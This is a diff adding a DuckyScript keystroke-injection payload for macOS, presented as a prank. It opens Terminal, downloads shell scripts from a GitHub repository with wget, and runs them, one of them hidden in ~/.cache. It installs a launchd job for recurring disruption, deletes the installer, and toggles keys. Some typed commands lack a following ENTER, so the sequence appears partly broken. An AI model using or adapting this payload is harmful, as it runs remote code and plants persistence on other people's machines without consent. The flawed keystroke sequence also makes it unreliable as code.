@@ -1,0 +1,54 @@
+REM TITLE: Annoying Mac
+REM AUTHOR: jest
+REM TARGET OS: MacOS
+REM DESCRIPTION: An annoying payload that utilizes ducky/bash scripts to randomly turn on and off: wifi, capslock, numlock, press arrow keys, and teleports the mouse pointer around the screen.
+
+REM Opening terminal:
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING TERMINAL
+DELAY 500
+ENTER
+DELAY 500
+
+REM Downloading annoying_mac.sh script, giving execution permissions, and then executing it:
+STRING wget https://raw.githubusercontent.com/jestlandia/DuckyScript-Payloads/refs/heads/main/Payloads/Annoying_Mac/annoying_mac.sh
+DELAY 1000
+STRING chmod +x annoying_mac.sh
+STRING mv annoying_mac.sh ~/.cache/
+STRING ~/.cache/annoying_mac.sh
+DELAY 100
+ENTER
+DELAY 500
+
+REM Downloading annoying_launchd.sh script, giving execution permissions, then executing it to schedule recurring annoyance:
+STRING wget https://raw.githubusercontent.com/jestlandia/DuckyScript-Payloads/refs/heads/main/Payloads/Annoying_Mac/annoying_launchd.sh
+DELAY 1000
+STRING chmod +x annoying_launchd.sh && ./annoying_launchd.sh
+DELAY 100
+ENTER
+DELAY 300
+STRING rm -rf annoying_launchd.sh
+DELAY 100
+ENTER
+DELAY 300
+GUI W
+DELAY 200 
+ENTER
+
+REM Beginning loop to toggle capslock and move arrow keys up and down:
+CAPSLOCK
+DELAY 1000
+CAPSLOCK
+DELAY 300
+UP
+UP
+DELAY 400
+DOWN
+DOWN
+CAPSLOCK
+DELAY 1000
+UP
+CAPSLOCK
+ENTER
